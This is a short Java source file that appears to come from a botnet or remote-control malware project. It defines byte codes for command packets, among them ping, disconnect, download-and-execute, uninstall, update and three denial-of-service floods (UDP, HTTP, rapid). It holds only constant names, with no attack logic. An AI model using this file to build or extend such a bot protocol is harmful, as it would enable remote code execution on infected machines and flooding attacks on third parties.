package com.redpois0n.common.packets;

public class Headers {
	
	/**
	 * Packet headers
	 */
	
	public static final byte PACKET_PING = 0;
	public static final byte PACKET_LOG_PING = 6;
	
	public static final byte PACKET_DISCONNECT = 1;
	public static final byte PACKET_DOWNLOAD_EXECUTE = 2;
	public static final byte PACKET_RECONNECT = 3;
	public static final byte PACKET_UNINSTALL = 4;
	public static final byte PACKET_UPDATE = 5;
	
	public static final byte PACKET_UDP_FLOOD = 20;
	public static final byte PACKET_HTTP_FLOOD = 21;
	public static final byte PACKET_RAPID_FLOOD = 22;	
	
}
